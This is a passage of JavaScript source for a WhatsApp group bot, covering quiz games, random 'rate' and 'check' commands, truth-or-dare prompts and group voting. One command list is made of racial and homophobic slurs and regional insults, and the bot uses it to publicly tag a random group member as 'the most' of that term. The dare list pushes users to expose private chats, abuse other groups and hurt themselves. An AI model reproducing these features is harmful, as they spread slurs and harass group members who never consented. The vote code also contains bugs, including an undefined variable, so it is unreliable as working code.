SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess the picture' }, type: 1 }], `Time has run out\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,`${global.botname}`, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'word') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheWord.js')
let result = anu[Math.floor(Math.random() * anu.length)]
SkyzeeBOT.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `Time Out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'sentence') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheSentence.js')
let result = anu[Math.floor(Math.random() * anu.length)]
SkyzeeBOT.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess the Sentence' }, type: 1 }], `Time Out\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lyrics') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
SkyzeeBOT.sendText(m.chat, `Fill the missing lyrics below : *${result.soal}*?\nTime : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'guess saying') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
SkyzeeBOT.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess saying', buttonText: { displayText: 'Guess The Saying' }, type: 1 }], `Time Out\nAnswer:  ${caklontong[m.sender.split('@')[0]]}\nDescription : ${caklontong_desk[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break		
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replay(`There Are Still Unfinished Sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return replay(`Mode: ${Object.keys(modes).join(' | ')}\nFor Examples: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                SkyzeeBOT.sendText(m.chat, `*What Is The Result Of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time Out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'mysoulmate': {
            if (!m.isGroup) return replay(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Your Match Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
            if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, jawab, SkyzeeBOT.user.name, m, {mentions: ments})
            if (notButtons) await SkyzeeBOT.sendText(m.chat, jawab, m, {footer: SkyzeeBOT.user.name, mentions: ments})
            }
            break
            case 'couple': {
            if (!m.isGroup) return replay(`${mess.group}`)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
            if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, jawab, SkyzeeBOT.user.name, m, {mentions: menst})
            if (notButtons) await SkyzeeBOT.sendText(m.chat, jawab, m, {footer: SkyzeeBOT.user.name, mentions: menst})
            }
            break
            case 'is':
				if (!text) return replay(`Use Text, Example : ${prefix + command} he married `)
					const apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
					const kah = apa[Math.floor(Math.random() * apa.length)]
SkyzeeBOT.sendMessage(from, { text: `Question : Is ${q}\nAnswer : ${kah}` }, { quoted: m })

					break
					            case 'what':
				if (!text) return replay(`Use Text, Example : ${prefix + command} he married `)
					const lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
					const kahk = lel[Math.floor(Math.random() * lel.length)]
SkyzeeBOT.sendMessage(from, { text: `Question : What ${q}\nAnswer : ${kahk}` }, { quoted: m })

					break
case 'can':
				if (!text) return replay(`Use Text, Example : ${prefix + command} you fuck her lol `)
					const bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
					const ga = bisa[Math.floor(Math.random() * bisa.length)]
SkyzeeBOT.sendMessage(from, { text: `Question : Can ${q}\nAnswer : ${ga}` }, { quoted: m })

					break
case 'how':
				if (!text) return replay(`Use Text, Example : ${prefix + command} is my face`)
					const gimana = [`It's Okay`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah`,`Ohhh I See:(`,`The Patient, Boss:(`,`How Are You?`]
					const ya = gimana[Math.floor(Math.random() * gimana.length)]
SkyzeeBOT.sendMessage(from, { text: `Question : ${q}\nAnswer : How ${ya}` }, { quoted: m })

					break
case 'rate':
				if (!text) return replay(`Use Text, Example : ${prefix + command} My Dp`)
					const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
SkyzeeBOT.sendMessage(from, { text: `Rate : ${q}\nAnswer : *${te}%*` }, { quoted: m })

					break
  case 'handsomecheck':
				if (!text) return replay(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
SkyzeeBOT.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })

					break
case 'beautifulcheck':
				if (!text) return replay(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
SkyzeeBOT.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replay(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					SkyzeeBOT.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
                    case 'awesomecheck':
  case 'greatcheck': case 'gaycheck': case 'cutecheck': case 'lesbicheck': case 'lesbiancheck': case 'hornycheck': case 'prettycheck': case 'lovelycheck': case 'uglycheck':
				if (!q) return replay(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
SkyzeeBOT.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
					break
                    case 'stupid': case 'foolish': case 'smart': case 'idiot': case 'gay': case 'lesbi': case 'bastard': case 'stubble': case 'dog': case 'fuck': case 'ape': case 'noob': case 'great': case 'horny': case 'wibu': case 'asshole': case 'handsome': case 'beautiful': case 'cute': case 'kind': case 'ugly': case 'pretty': case 'lesbian': case 'randi': case 'gandu': case 'madarchod': case 'kala': case 'gora': case 'chutiya': case 'nibba': case 'nibbi': case 'bhosdiwala': case 'chutmarika': case 'bokachoda': case 'suarerbaccha': case 'bolochoda': case 'muthal': case 'muthbaaz': case 'randibaaz': case 'topibaaz': case 'cunt': case 'nerd': case 'behenchod': case 'behnchoda': case 'bhosdika': case 'nerd': case 'mc': case 'bsdk': case 'bhosdk': case 'nigger': case 'loda': case 'laund': case 'nigga': case 'noobra': case 'tharki': case 'nibba': case 'nibbi': case 'mumu': case 'rascal': case 'scumbag': case 'nuts': case 'comrade': case 'fagot': case 'scoundrel': case 'ditch': case 'dope': case 'gucci': case 'lit': case 'dumbass': case 'sexy': case 'crackhead': case 'mf': case 'motherfucker': case 'dogla': case 'bewda': case 'boka': case 'khanki': case 'bal': case 'sucker': case 'fuckboy': case 'playboy': case 'fuckgirl': case 'playgirl': case 'hot': {
            if (!m.isGroup) return replay(`${mess.group}`)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `The Most *${command}* Here Is @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '👀', buttonText: { displayText: '👀😂' }, type: 1 }
                    ]
            if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            if (notButtons) await SkyzeeBOT.sendText(m.chat, jawab, m, {footer: botname, mentions: ments})
            }
            break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss🥺👉🏼👈🏼",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting room😂",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice note🤣🤣",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice note😂",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice note😂",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love you😌",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              SkyzeeBOT.sendMessage(from, { image: buffer, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ðŸ¤£ðŸ¤£",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetrilðŸ¤£", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¦„",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              SkyzeeBOT.sendMessage(from, { image: buffer, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
case 'when':
				if (!q) return replay(`Use Text, Example : ${prefix + command} will i get married `)
					const kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow',`After This Command, You Too ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
SkyzeeBOT.sendMessage(from, { text: `Question : ${q}\nAnswer : *${kapankah}*` }, { quoted: m })
					break
case 'wangy':
              if (!q) return replay(`Use Text, Example : ${prefix + command} hinata`)
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaah the smell of hair ${qq} smelly i want to smell the fragrance ${qq} AAAAAAAAH ~ Her hair.... aaah i want to stroke her hair too ~~ AAAAAH ${qq} first time out in anime is cute too ❤️ ❤️ ❤️ so AAAAAAAH ${qq} AAAAAA LUCCUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️what ? ${qq} it's not real ? Just HELL you say ? no, no no no no no no no no no no no no no no no !! I DON'T CARE ABOUT THE REALITY, I DON'T CARE. ❤️ ❤️ ❤️ ${qq} me ... ${qq} on the laptop watching me, ${qq} .. you believe in me ? aaaaaaaaaaah thanks ${q} I don't want to give up ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH I STILL HAVE ${qq} ALSO NOT THE SAME AAAAAAAAAAAAAAH`
             reply(awikwok)
              break
case 'checkdeath':
             if (!q) return replay(`Use Someone's Name, Example : ${prefix + command} Bot`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Name : ${predea.data.name}\n*Dead At Age :* ${predea.data.age} Year.\n\n_Quick, Quick, Repent Bro, Because No One Knows About Death_`)
              break  
	    case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //wont response when limit runs out\\
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!q) return replay(`Enter Query Text!`)
                let anu = await styletext(q)
                let teks = `Entered Text ${q}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) return replay(`${mess.group}`)
            if (m.chat in vote) replay(`_There Are Still Votes In This Chat!_\n\n*${prefix}delvote* - To Delete Vote Session`)
            if (!q) return replay(`Enter Reason For Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting Starts!\n\n*${prefix}upvote* - For Upvote\n*${prefix}devote* - For Devote\n*${prefix}checkvote* - To Check The Vote\n*${prefix}delvote* - To Delete Vote Session`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}delvote* - To Delete Vote Session`
let buttons = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'Upvote'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'Devote'}, type: 1}
]
let buttonMessageVote = {
                text: teks_vote,
                footer: SkyzeeBOT.user.name,
                buttons: buttons,
                headerType: 1
            }
     if (notButtons) {
        teks_vote += `\n*${prefix}upvote* - To Up Vote Session\n*${prefix}devote* - To Down Vote Session`
        delete buttonMessageVote.buttons
    }
            SkyzeeBOT.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return replay(`${mess.group}`)
            if (!(m.chat in vote)) return replay(`_*No Voting In This Group!*_\n\n*${prefix}vote* - To Start Voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) replay(`You've Voted`)
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}delvote* - To Delete Vote Session`
            let buttons = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'Upvote'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'Devote'}, type: 1}
            ]
            let buttonMessageVote = {
                text: teks_vote,
                footer: SkyzeeBOT.user.name,
                buttons: buttons,
                headerType: 1,
                mentions: menvote
            }
     if (notButtons) {
        teks_vote += `\n*${prefix}upvote* - To Up Vote Session\n*${prefix}devote* - To Down Vote Session`
        delete buttonMessageVote.buttons
    }
            SkyzeeBOT.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) return replay(`${mess.group}`)
            if (!(m.chat in vote)) return replay(`_*No Voting In This Group!*_\n\n*${prefix}vote* - To Start Voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replay(`You've Voted`)
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
┃╠ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}delvote* - To Delete Vote Session`
            let buttons = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'Upvote'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'Devote'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: SkyzeeBOT.user.name,
                buttons: buttons,
                headerType: 1,
                mentions: menvote
            }
     if (notButtons) {
        teks_vote += `\n*${prefix}upvote* - To Up Vote Session\n*${prefix}devote* - To Down Vote Session`
        delete buttonMessageDevote.buttons
     }
            SkyzeeBOT.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return replay(`${mess.group}`)
if (!(m.chat in vote)) return replay(`_*No Voting In This Group!*_\n\n*${prefix}vote* - To Start Voting`)
teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
┃╠ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
┃╠ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `┃╠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}delvote* - To Delete Vote Session


©${SkyzeeBOT.user.id}
`
SkyzeeBOT.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return replay(`${mess.group}`)
            if (!(m.chat in vote)) return replay(`_*No Voting In This Group!*_\n\n*${prefix}vote* - To Start Voting`)
            delete vote[m.chat]
            reply('Successfully Deleted The Vote Session In This Group')
	    }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return replay(`${mess.group}`)
                let response = await SkyzeeBOT.groupInviteCode(m.chat)
                SkyzeeBOT.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n${groupMetadata.subject} Group Link`, m, { detectLink: true })
            }
            break
            
            case 'groupsettings': case 'settingsgroup': {
                    let sections = []
                    let com = [`group open`,`editinfo open`,`temporalmsg on`,`nsfw on`,`levelingsetting on`,`autosticker on`,`autoreply on`,`welcome on`,`antiflood on`,`antilinkgc on`,`antilinktg on`,`antilinktt on`,`antilinkytvid on`,`antilinkig on`,`antilinkfb on`,`antilinktwit on`,`antilinkall on`,`antiwame on`,`antitoxic on`,`antidoc on`]
